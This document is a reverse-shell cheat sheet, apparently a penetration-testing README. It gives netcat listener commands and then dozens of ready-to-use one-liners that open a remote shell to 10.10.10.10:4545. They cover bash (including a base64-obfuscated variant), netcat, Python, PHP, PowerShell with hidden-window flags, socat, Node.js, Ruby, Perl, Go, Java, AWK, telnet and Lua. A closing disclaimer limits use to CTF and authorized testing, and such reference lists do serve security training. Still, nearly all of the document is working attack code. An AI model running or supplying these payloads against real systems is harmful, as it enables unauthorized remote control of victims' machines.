> **LHOST:** `tun0` / Target Listener IP (Placeholder: `10.10.10.10`)  
> **LPORT:** Target Listener Port (Placeholder: `4545`)  
> *Ensure your listener is active before executing payloads.*

```bash

# Standard Netcat listener
nc -lnvp 4545

# Netcat with rlwrap (line history & navigation)
rlwrap nc -lnvp 4545

# Ncat with SSL/TLS
ncat -lnvp 4545 --ssl
```

-----------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------                            
# Reverse Shells :

### BASH:
```                               
Standard interactive TCP redirect

bash -i >& /dev/tcp/10.10.10.10/4545 0>&1

# File descriptor 196 redirection
0<&196;exec 196<>/dev/tcp/10.10.10.10/4545; sh <&196 >&196 2>&196

# Base64 encoded wrapper
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC80NTQ1IDA+JjE= | base64 -d | bash
```
-----------------------------------------------------------------------------------------------------------
### NETCAT & NCAT :
```
# Traditional Netcat (-e /bin/sh)
nc -e /bin/sh 10.10.10.10 4545

# Traditional Netcat (-e /bin/bash)
nc -e /bin/bash 10.10.10.10 4545

# Netcat with -c flag
nc -c bash 10.10.10.10 4545

# Netcat OpenBSD / BusyBox (Named Pipe FIFO)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.10.10 4545 > /tmp/f

# Ncat (TCP)
ncat 10.10.10.10 4545 -e /bin/bash

# Ncat (UDP)
ncat --udp 10.10.10.10 4545 -e /bin/bash
```
-----------------------------------------------------------------------------------------------------------
### PYTHON :
```
# Python 2 / Python 3 standard
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4545));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Python 3 with pty spawn
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4545));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```
-----------------------------------------------------------------------------------------------------------
### PHP :
```
# Standard exec
php -r '$sock=fsockopen("10.10.10.10",4545);exec("/bin/sh -i <&3 >&3 2>&3");'

# shell_exec
php -r '$s=fsockopen("10.10.10.10",4545);shell_exec("/bin/sh -i <&3 >&3 2>&3");'

# Backtick execution
php -r '$s=fsockopen("10.10.10.10",4545);`/bin/sh -i <&3 >&3 2>&3`;'

# system()
php -r '$s=fsockopen("10.10.10.10",4545);system("/bin/sh -i <&3 >&3 2>&3");'

# popen()
php -r '$s=fsockopen("10.10.10.10",4545);popen("/bin/sh -i <&3 >&3 2>&3", "r");'

# proc_open()
php -r '$sock=fsockopen("10.10.10.10",4545);$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'
```
-----------------------------------------------------------------------------------------------------------
### POWERSHELL (WINDOWS) :
```
Standard TCP Client (One-liner)
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',4545);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

Hidden execution flags
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',4545);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
-----------------------------------------------------------------------------------------------------------
### SOCAT :
```
# Linux (PTY spawned directly)
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.10:4545

# Windows (socat.exe)
socat.exe -d -d TCP4:10.10.10.10:4545 EXEC:'cmd.exe',pipes
```
-----------------------------------------------------------------------------------------------------------
### NODE.JS :
```
node -e '(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var client=new net.Socket();client.connect(4545,"10.10.10.10",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();'
```
-----------------------------------------------------------------------------------------------------------          
### RUBY :
```
# Spawn shell via exec
ruby -rsocket -e'f=TCPSocket.open("10.10.10.10",4545).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# Forked process (Linux)
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.10.10.10","4545");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

# Windows
ruby -rsocket -e 'c=TCPSocket.new("10.10.10.10","4545");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
-----------------------------------------------------------------------------------------------------------
### PERL :
```
# Standard Socket (Linux)
perl -e 'use Socket;$i="10.10.10.10";$p=4545;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# IO::Socket (Forked)
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.10.10.10:4545");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'

# IO::Socket (Windows)
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"10.10.10.10:4545");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;' 
```
-----------------------------------------------------------------------------------------------------------
### GOLANG :
```
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","10.10.10.10:4545");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```
-----------------------------------------------------------------------------------------------------------                        
### JAVA & GROOVY :
```
// Java Runtime exec
r = Runtime.getRuntime();p = r.exec(["/bin/sh","-c","exec 5<>/dev/tcp/10.10.10.10/4545;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]);p.waitFor();
```
-----------------------------------------------------------------------------------------------------------     
### AWK & TELNET :
```
# AWK TCP client
awk 'BEGIN {s = "/inet/tcp/0/10.10.10.10/4545"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null

# Telnet Named Pipe
rm -f /tmp/p; mknod /tmp/p p && telnet 10.10.10.10 4545 0</tmp/p | /bin/sh 1>/tmp/p 2>&1
```
-----------------------------------------------------------------------------------------------------------   
### LUA :
```
# Lua (Linux / standard socket)
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.10.10.10','4545');os.execute('/bin/sh -i <&3 >&3 2>&3');"

# Lua 5.1 Loop
lua5.1 -e 'local host, port = "10.10.10.10", 4545 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
-----------------------------------------------------------------------------------------------------------   


---

<div align="center">

### Legal Disclaimer

**Maintained & Owned by 5kullk3r**

*This material is created exclusively for authorized Capture The Flag (CTF) challenges, educational & ethical purposes, and legal security auditing with explicit permission.*

<sub>Unauthorized system access is illegal. **5kullk3r** disclaims all liability for any misuse or damages.</sub>

</div>


                               
